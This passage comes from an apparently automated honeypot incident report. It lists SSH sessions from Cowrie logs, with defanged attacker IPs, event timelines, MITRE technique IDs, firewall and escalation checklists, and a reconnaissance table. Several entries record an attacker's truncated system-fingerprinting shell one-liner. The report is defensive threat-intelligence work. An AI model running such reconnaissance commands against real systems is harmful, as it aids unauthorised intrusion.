| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.failed` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.failed` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.failed` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.command.input` |
| `2026-08-12 06:14:57` | `cowrie.log.closed` |
| `2026-08-12 06:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.26.220[.]254` to AbuseIPDB if not already reported
- [ ] Block `120.26.220[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc5ef31b6365

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:16 |
| **Last Seen** | 2026-08-12 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:16:27` | `cowrie.session.connect` |
| `2026-08-12 06:16:27` | `cowrie.client.version` |
| `2026-08-12 06:16:27` | `cowrie.client.kex` |
| `2026-08-12 06:16:28` | `cowrie.login.success` |
| `2026-08-12 06:16:28` | `cowrie.session.params` |
| `2026-08-12 06:16:28` | `cowrie.command.input` |
| `2026-08-12 06:16:28` | `cowrie.command.input` |
| `2026-08-12 06:16:28` | `cowrie.command.input` |
| `2026-08-12 06:16:28` | `cowrie.command.input` |
| `2026-08-12 06:16:28` | `cowrie.command.input` |
| `2026-08-12 06:16:28` | `cowrie.command.success` |
| `2026-08-12 06:16:28` | `cowrie.command.input` |
| `2026-08-12 06:16:28` | `cowrie.command.input` |
| `2026-08-12 06:16:28` | `cowrie.command.input` |
| `2026-08-12 06:16:28` | `cowrie.command.input` |
| `2026-08-12 06:16:29` | `cowrie.log.closed` |
| `2026-08-12 06:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4bfc1013388

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:18 |
| **Last Seen** | 2026-08-12 06:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:18:45` | `cowrie.session.connect` |
| `2026-08-12 06:18:45` | `cowrie.client.version` |
| `2026-08-12 06:18:45` | `cowrie.client.kex` |
| `2026-08-12 06:18:45` | `cowrie.login.success` |
| `2026-08-12 06:18:46` | `cowrie.session.params` |
| `2026-08-12 06:18:46` | `cowrie.command.input` |
| `2026-08-12 06:18:46` | `cowrie.command.input` |
| `2026-08-12 06:18:46` | `cowrie.command.input` |
| `2026-08-12 06:18:46` | `cowrie.command.input` |
| `2026-08-12 06:18:46` | `cowrie.command.input` |
| `2026-08-12 06:18:46` | `cowrie.command.success` |
| `2026-08-12 06:18:46` | `cowrie.command.input` |
| `2026-08-12 06:18:46` | `cowrie.command.input` |
| `2026-08-12 06:18:46` | `cowrie.command.input` |
| `2026-08-12 06:18:46` | `cowrie.command.input` |
| `2026-08-12 06:18:47` | `cowrie.log.closed` |
| `2026-08-12 06:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d7170e4f92

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:21 |
| **Last Seen** | 2026-08-12 06:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:21:06` | `cowrie.session.connect` |
| `2026-08-12 06:21:06` | `cowrie.client.version` |
| `2026-08-12 06:21:06` | `cowrie.client.kex` |
| `2026-08-12 06:21:07` | `cowrie.login.success` |
| `2026-08-12 06:21:08` | `cowrie.session.params` |
| `2026-08-12 06:21:08` | `cowrie.command.input` |
| `2026-08-12 06:21:08` | `cowrie.command.input` |
| `2026-08-12 06:21:08` | `cowrie.command.input` |
| `2026-08-12 06:21:08` | `cowrie.command.input` |
| `2026-08-12 06:21:08` | `cowrie.command.input` |
| `2026-08-12 06:21:08` | `cowrie.command.success` |
| `2026-08-12 06:21:08` | `cowrie.command.input` |
| `2026-08-12 06:21:08` | `cowrie.command.input` |
| `2026-08-12 06:21:08` | `cowrie.command.input` |
| `2026-08-12 06:21:08` | `cowrie.command.input` |
| `2026-08-12 06:21:08` | `cowrie.log.closed` |
| `2026-08-12 06:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5676dbde6171

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:23 |
| **Last Seen** | 2026-08-12 06:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:23:21` | `cowrie.session.connect` |
| `2026-08-12 06:23:21` | `cowrie.client.version` |
| `2026-08-12 06:23:21` | `cowrie.client.kex` |
| `2026-08-12 06:23:22` | `cowrie.login.success` |
| `2026-08-12 06:23:23` | `cowrie.session.params` |
| `2026-08-12 06:23:23` | `cowrie.command.input` |
| `2026-08-12 06:23:23` | `cowrie.command.input` |
| `2026-08-12 06:23:23` | `cowrie.command.input` |
| `2026-08-12 06:23:23` | `cowrie.command.input` |
| `2026-08-12 06:23:23` | `cowrie.command.input` |
| `2026-08-12 06:23:23` | `cowrie.command.success` |
| `2026-08-12 06:23:23` | `cowrie.command.input` |
| `2026-08-12 06:23:23` | `cowrie.command.input` |
| `2026-08-12 06:23:23` | `cowrie.command.input` |
| `2026-08-12 06:23:23` | `cowrie.command.input` |
| `2026-08-12 06:23:24` | `cowrie.log.closed` |
| `2026-08-12 06:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c647d41cd921

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-08-12 06:23 |
| **Last Seen** | 2026-08-12 06:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:23:28` | `cowrie.session.connect` |
| `2026-08-12 06:23:29` | `cowrie.client.version` |
| `2026-08-12 06:23:29` | `cowrie.client.kex` |
| `2026-08-12 06:23:31` | `cowrie.login.success` |
| `2026-08-12 06:23:31` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5138f65894c1

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-08-12 06:23 |
| **Last Seen** | 2026-08-12 06:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:23:36` | `cowrie.session.connect` |
| `2026-08-12 06:23:36` | `cowrie.client.version` |
| `2026-08-12 06:23:36` | `cowrie.client.kex` |
| `2026-08-12 06:23:37` | `cowrie.login.success` |
| `2026-08-12 06:23:38` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a853b1305759

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:25 |
| **Last Seen** | 2026-08-12 06:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:25:42` | `cowrie.session.connect` |
| `2026-08-12 06:25:42` | `cowrie.client.version` |
| `2026-08-12 06:25:42` | `cowrie.client.kex` |
| `2026-08-12 06:25:43` | `cowrie.login.success` |
| `2026-08-12 06:25:45` | `cowrie.session.params` |
| `2026-08-12 06:25:45` | `cowrie.command.input` |
| `2026-08-12 06:25:45` | `cowrie.command.input` |
| `2026-08-12 06:25:45` | `cowrie.command.input` |
| `2026-08-12 06:25:45` | `cowrie.command.input` |
| `2026-08-12 06:25:45` | `cowrie.command.input` |
| `2026-08-12 06:25:45` | `cowrie.command.success` |
| `2026-08-12 06:25:45` | `cowrie.command.input` |
| `2026-08-12 06:25:45` | `cowrie.command.input` |
| `2026-08-12 06:25:45` | `cowrie.command.input` |
| `2026-08-12 06:25:45` | `cowrie.command.input` |
| `2026-08-12 06:25:45` | `cowrie.log.closed` |
| `2026-08-12 06:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fac8e0f1d1dd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:28 |
| **Last Seen** | 2026-08-12 06:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:28:00` | `cowrie.session.connect` |
| `2026-08-12 06:28:00` | `cowrie.client.version` |
| `2026-08-12 06:28:00` | `cowrie.client.kex` |
| `2026-08-12 06:28:01` | `cowrie.login.success` |
| `2026-08-12 06:28:02` | `cowrie.session.params` |
| `2026-08-12 06:28:02` | `cowrie.command.input` |
| `2026-08-12 06:28:02` | `cowrie.command.input` |
| `2026-08-12 06:28:02` | `cowrie.command.input` |
| `2026-08-12 06:28:02` | `cowrie.command.input` |
| `2026-08-12 06:28:02` | `cowrie.command.input` |
| `2026-08-12 06:28:02` | `cowrie.command.success` |
| `2026-08-12 06:28:02` | `cowrie.command.input` |
| `2026-08-12 06:28:02` | `cowrie.command.input` |
| `2026-08-12 06:28:02` | `cowrie.command.input` |
| `2026-08-12 06:28:02` | `cowrie.command.input` |
| `2026-08-12 06:28:02` | `cowrie.log.closed` |
| `2026-08-12 06:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeaf9e8adf52

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 06:30 |
| **Last Seen** | 2026-08-12 06:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:30:12` | `cowrie.session.connect` |
| `2026-08-12 06:30:12` | `cowrie.client.version` |
| `2026-08-12 06:30:13` | `cowrie.client.kex` |
| `2026-08-12 06:30:13` | `cowrie.login.success` |
| `2026-08-12 06:30:15` | `cowrie.session.params` |
| `2026-08-12 06:30:15` | `cowrie.command.input` |
| `2026-08-12 06:30:15` | `cowrie.command.input` |
| `2026-08-12 06:30:15` | `cowrie.command.input` |
| `2026-08-12 06:30:15` | `cowrie.command.input` |
| `2026-08-12 06:30:15` | `cowrie.command.input` |
| `2026-08-12 06:30:15` | `cowrie.command.success` |
| `2026-08-12 06:30:15` | `cowrie.command.input` |
| `2026-08-12 06:30:15` | `cowrie.command.input` |
| `2026-08-12 06:30:15` | `cowrie.command.input` |
| `2026-08-12 06:30:15` | `cowrie.command.input` |
| `2026-08-12 06:30:15` | `cowrie.log.closed` |
| `2026-08-12 06:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-595bdfb29cbb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.210[.]132` |
| **First Seen** | 2026-08-12 06:37 |
| **Last Seen** | 2026-08-12 06:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:37:54` | `cowrie.session.connect` |
| `2026-08-12 06:37:55` | `cowrie.client.version` |
| `2026-08-12 06:37:55` | `cowrie.client.kex` |
| `2026-08-12 06:37:56` | `cowrie.login.success` |
| `2026-08-12 06:37:57` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.210[.]132` to AbuseIPDB if not already reported
- [ ] Block `144.22.210[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b46e0398ef2d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-08-12 06:38 |
| **Last Seen** | 2026-08-12 06:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:38:08` | `cowrie.session.connect` |
| `2026-08-12 06:38:08` | `cowrie.client.version` |
| `2026-08-12 06:38:08` | `cowrie.client.kex` |
| `2026-08-12 06:38:10` | `cowrie.login.success` |
| `2026-08-12 06:38:10` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf2a734a596

| Field | Detail |
|---|---|
| **Source IP** | `119.152.54[.]111` |
| **First Seen** | 2026-08-12 06:38 |
| **Last Seen** | 2026-08-12 06:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:38:15` | `cowrie.session.connect` |
| `2026-08-12 06:38:16` | `cowrie.client.version` |
| `2026-08-12 06:38:16` | `cowrie.client.kex` |
| `2026-08-12 06:38:17` | `cowrie.login.success` |
| `2026-08-12 06:38:18` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.54[.]111` to AbuseIPDB if not already reported
- [ ] Block `119.152.54[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47559acf134a

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-08-12 06:43 |
| **Last Seen** | 2026-08-12 06:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:43:04` | `cowrie.session.connect` |
| `2026-08-12 06:43:05` | `cowrie.client.version` |
| `2026-08-12 06:43:05` | `cowrie.client.kex` |
| `2026-08-12 06:43:07` | `cowrie.login.success` |
| `2026-08-12 06:43:07` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:43:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e3d52bfd2a

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-08-12 06:48 |
| **Last Seen** | 2026-08-12 06:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:48:32` | `cowrie.session.connect` |
| `2026-08-12 06:48:32` | `cowrie.client.version` |
| `2026-08-12 06:48:32` | `cowrie.client.kex` |
| `2026-08-12 06:48:34` | `cowrie.login.success` |
| `2026-08-12 06:48:34` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a43cc314f61

| Field | Detail |
|---|---|
| **Source IP** | `218.21.241[.]50` |
| **First Seen** | 2026-08-12 06:48 |
| **Last Seen** | 2026-08-12 06:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 06:48:39` | `cowrie.session.connect` |
| `2026-08-12 06:48:40` | `cowrie.client.version` |
| `2026-08-12 06:48:40` | `cowrie.client.kex` |
| `2026-08-12 06:48:42` | `cowrie.login.success` |
| `2026-08-12 06:48:43` | `cowrie.direct-tcpip.request` |
| `2026-08-12 06:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `218.21.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.76.177[.]222` | **30** | 2026-08-12 05:28 | 2026-08-12 05:29 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **7** | 2026-08-12 05:12 | 2026-08-12 06:50 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-12 05:16 | 2026-08-12 06:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `152.32.156[.]50` | **4** | 2026-08-12 06:00 | 2026-08-12 06:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]37` | **4** | 2026-08-12 05:15 | 2026-08-12 05:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `38.210.185[.]61` | **3** | 2026-08-12 06:51 | 2026-08-12 06:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-08-12 05:08 | 2026-08-12 05:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.36.123[.]55` | **3** | 2026-08-12 05:23 | 2026-08-12 05:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]121` | **3** | 2026-08-12 06:34 | 2026-08-12 06:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-08-12 06:08 | 2026-08-12 06:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.50.208[.]104` | **2** | 2026-08-12 05:13 | 2026-08-12 05:30 | 4m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]38` | **2** | 2026-08-12 05:15 | 2026-08-12 05:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]39` | **2** | 2026-08-12 05:16 | 2026-08-12 05:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]40` | **2** | 2026-08-12 05:16 | 2026-08-12 05:16 | 0m | 0 | `T1592` | 🟢 LOW |
